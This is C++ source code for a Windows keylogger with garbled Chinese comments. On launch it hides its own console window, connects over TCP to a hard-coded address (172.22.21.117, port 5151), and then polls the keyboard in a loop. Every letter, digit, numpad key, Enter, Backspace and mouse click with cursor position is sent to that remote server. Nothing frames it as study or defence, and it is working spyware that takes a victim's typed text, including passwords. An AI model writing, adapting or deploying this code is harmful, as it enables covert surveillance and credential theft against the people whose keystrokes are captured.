#include <WINSOCK2.H>
#include<ctime>
#include<windows.h>
#include<bits/stdc++.h>
#include<ctime>
#define tin int
#define itn int
#define tni int
#define nit int
#define nti int
#define pritnf printf
#define scnaf scanf
#define retrun return
#define ll long long
#define inl inline
#define infa 0x3f3f3f3f
#define infb 0x7fffffff
#define infc 1061109567
#define infd 0x7f
#define maxa 100004

#define jc(VK_NONAME) ((GetAsyncKeyState(VK_NONAME)& 0x8000)?1:0)
#define dd GetCursorPos(&p)
#define yd(a,b) p.x+=a,p.y+=b;
#define ds time_t t=time(0);strftime(a,sizeof(a),"%Y/%m/%d %X",localtime(&t))

#define SERVER_ADDRESS "172.22.21.117" //��������IP��ַ      
#define PORT 5151
#define MSGSIZE 10240         //�շ��������Ĵ�С      
#pragma comment(lib, "ws2_32.lib")
using namespace std;

HWND hwnd;

char a[maxa]="";
POINT p;
char str[256];
WSADATA wsaData;    
SOCKET sClient;//���������׽��� 
SOCKADDR_IN server;//����Զ�̷������ĵ�ַ��Ϣ
char szMessage[maxa];//�շ�������      
int ret;//�ɹ������ֽڵĸ���
char nowtime[maxa]="";

itn main()
{
	GetConsoleTitle(str,sizeof(str));
	hwnd=FindWindow(NULL,str);
	ShowWindow(hwnd,0);
	//freopen("D://out.txt","w",stdout);
	//
	WSAStartup(0x0202,&wsaData);// Initialize Windows socket library
    //
    sClient=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);// �����ͻ����׽��֣�AF_INETָ��ʹ��TCP/IPЭ���壻
	//SOCK_STREAM, IPPROTO_TCP����ָ��ʹ��TCPЭ��
	//ָ��Զ�̷������ĵ�ַ��Ϣ(�˿ںš�IP��ַ��)      
    memset(&server, 0, sizeof(SOCKADDR_IN)); //�Ƚ������ַ��server��Ϊȫ0 
    server.sin_family=PF_INET; //������ַ��ʽ��TCP/IP��ַ��ʽ
    server.sin_port=htons(PORT); //ָ�����ӷ������Ķ˿ںţ�htons()���� converts values between the host and network byte order
    server.sin_addr.s_addr=inet_addr(SERVER_ADDRESS); //ָ�����ӷ�������IP��ַ
    //�ṹSOCKADDR_IN��sin_addr�ֶ����ڱ���IP��ַ��sin_addr�ֶ�Ҳ��һ���ṹ�壬sin_addr.s_addr�������ձ���IP��ַ
    //inet_addr()���ڽ� �����"127.0.0.1"�ַ���ת��ΪIP��ַ��ʽ
    //�����ղ�ָ���ķ�������      
    connect(sClient,(struct sockaddr*)&server,sizeof(SOCKADDR_IN));//���Ӻ������sClient��ʹ���������
    //server������Զ�̷������ĵ�ַ��Ϣ
    //
	while(1)
	{
		//����� 
		if(jc(MOUSE_MOVED))
		{
			dd;
			ds;
			sprintf(szMessage,"��� x:%d y:%d",p.x,p.y);
			send(sClient,szMessage,strlen(szMessage),0);
			//printf("    ��� x:%d y:%d\n",p.x,p.y);
			while(jc(MOUSE_MOVED)){}
		}
		if(jc(MOUSE_EVENT))
		{
			dd;
			ds;
			sprintf(szMessage,"�Ҽ� x:%d y:%d",p.x,p.y);
			send(sClient,szMessage,strlen(szMessage),0);
			//printf("    �Ҽ� x:%d y:%d\n",p.x,p.y);
			while(jc(MOUSE_EVENT)){}
		}
		//��ĸ�� 
		if(GetAsyncKeyState(65))
		{
			ds;
			sprintf(szMessage,"A");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(65)){}
		}
		if(GetAsyncKeyState(66))
		{
			ds;
			sprintf(szMessage,"B");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(66)){}
		}
		if(GetAsyncKeyState(67))
		{
			ds;
			sprintf(szMessage,"C");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(67)){}
		}
		if(GetAsyncKeyState(68))
		{
			ds;
			sprintf(szMessage,"D");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(68)){}
		}
		if(GetAsyncKeyState(69))
		{
			ds;
			sprintf(szMessage,"E");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(69)){}
		}
		if(GetAsyncKeyState(70))
		{
			ds;
			sprintf(szMessage,"F");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(70)){}
		}
		if(GetAsyncKeyState(71))
		{
			ds;
			sprintf(szMessage,"G");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(71)){}
		}
		if(GetAsyncKeyState(72))
		{
			ds;
			sprintf(szMessage,"H");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(72)){}
		}
		if(GetAsyncKeyState(73))
		{
			ds;
			sprintf(szMessage,"I");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(73)){}
		}
		if(GetAsyncKeyState(74))
		{
			ds;
			sprintf(szMessage,"J");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(74)){}
		}
		if(GetAsyncKeyState(75))
		{
			ds;
			sprintf(szMessage,"K");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(75)){}
		}
		if(GetAsyncKeyState(76))
		{
			ds;
			sprintf(szMessage,"L");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(76)){}
		}
		if(GetAsyncKeyState(77))
		{
			ds;
			sprintf(szMessage,"M");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(77)){}
		}
		if(GetAsyncKeyState(78))
		{
			ds;
			sprintf(szMessage,"N");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(78)){}
		}
		if(GetAsyncKeyState(79))
		{
			ds;
			sprintf(szMessage,"O");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(79)){}
		}
		if(GetAsyncKeyState(80))
		{
			ds;
			sprintf(szMessage,"P");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(80)){}
		}
		if(GetAsyncKeyState(81))
		{
			ds;
			sprintf(szMessage,"Q");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(81)){}
		}
		if(GetAsyncKeyState(82))
		{
			ds;
			sprintf(szMessage,"R");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(82)){}
		}
		if(GetAsyncKeyState(83))
		{
			ds;
			sprintf(szMessage,"S");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(83)){}
		}
		if(GetAsyncKeyState(84))
		{
			ds;
			sprintf(szMessage,"T");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(84)){}
		}
		if(GetAsyncKeyState(85))
		{
			ds;
			sprintf(szMessage,"U");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(85)){}
		}
		if(GetAsyncKeyState(86))
		{
			ds;
			sprintf(szMessage,"V");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(86)){}
		}
		if(GetAsyncKeyState(87))
		{
			ds;
			sprintf(szMessage,"W");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(87)){}
		}
		if(GetAsyncKeyState(88))
		{
			ds;
			sprintf(szMessage,"X");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(88)){}
		}
		if(GetAsyncKeyState(89))
		{
			ds;
			sprintf(szMessage,"Y");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(89)){}
		}
		if(GetAsyncKeyState(90))
		{
			ds;
			sprintf(szMessage,"Z");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(90)){}
		}
		//������
		if((GetAsyncKeyState(96))||(GetAsyncKeyState(48)))
		{
			ds;
			sprintf(szMessage,"0");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(96))||(GetAsyncKeyState(48))){}
		}
		if((GetAsyncKeyState(97))||(GetAsyncKeyState(49)))
		{
			ds;
			sprintf(szMessage,"1");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(97))||(GetAsyncKeyState(49))){}
		}
		if((GetAsyncKeyState(98))||(GetAsyncKeyState(50)))
		{
			ds;
			sprintf(szMessage,"2");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(98))||(GetAsyncKeyState(50))){}
		}
		if((GetAsyncKeyState(99))||(GetAsyncKeyState(51)))
		{
			ds;
			sprintf(szMessage,"3");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(99))||(GetAsyncKeyState(51))){}
		}
		if((GetAsyncKeyState(100))||(GetAsyncKeyState(52)))
		{
			ds;
			sprintf(szMessage,"4");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(100))||(GetAsyncKeyState(52))){}
		}
		if((GetAsyncKeyState(101))||(GetAsyncKeyState(53)))
		{
			ds;
			sprintf(szMessage,"5");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(101))||(GetAsyncKeyState(53))){}
		}
		if((GetAsyncKeyState(102))||(GetAsyncKeyState(54)))
		{
			ds;
			sprintf(szMessage,"6");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(102))||(GetAsyncKeyState(54))){}
		}
		if((GetAsyncKeyState(103))||(GetAsyncKeyState(55)))
		{
			ds;
			sprintf(szMessage,"7");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(103))||(GetAsyncKeyState(55))){}
		}
		if((GetAsyncKeyState(104))||(GetAsyncKeyState(56)))
		{
			ds;
			sprintf(szMessage,"8");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(104))||(GetAsyncKeyState(56))){}
		}
		if((GetAsyncKeyState(105))||(GetAsyncKeyState(57)))
		{
			ds;
			sprintf(szMessage,"9");
			send(sClient,szMessage,strlen(szMessage),0);
			while((GetAsyncKeyState(105))||(GetAsyncKeyState(57))){}
		}
		if(GetAsyncKeyState(106))
		{
			ds;
			sprintf(szMessage,"��");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(106)){}
		}
		if(GetAsyncKeyState(107))
		{
			ds;
			sprintf(szMessage,"��");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(107)){}
		}
		if(GetAsyncKeyState(109))
		{
			ds;
			sprintf(szMessage,"��");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(109)){}
		}
		if(GetAsyncKeyState(110))
		{
			ds;
			sprintf(szMessage,".");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(110)){}
		}
		if(GetAsyncKeyState(111))
		{
			ds;
			sprintf(szMessage,"�»�/");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(111)){}
		}
		//ָ���� 
		if(GetAsyncKeyState(VK_RETURN))
		{
			ds;
			sprintf(szMessage,"�س�");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(VK_RETURN)){}
		}
		if(GetAsyncKeyState(VK_BACK))
		{
			ds;
			sprintf(szMessage,"�˸�");
			send(sClient,szMessage,strlen(szMessage),0);
			while(GetAsyncKeyState(VK_BACK)){}
		}
	}
	//
	return 0;	
}
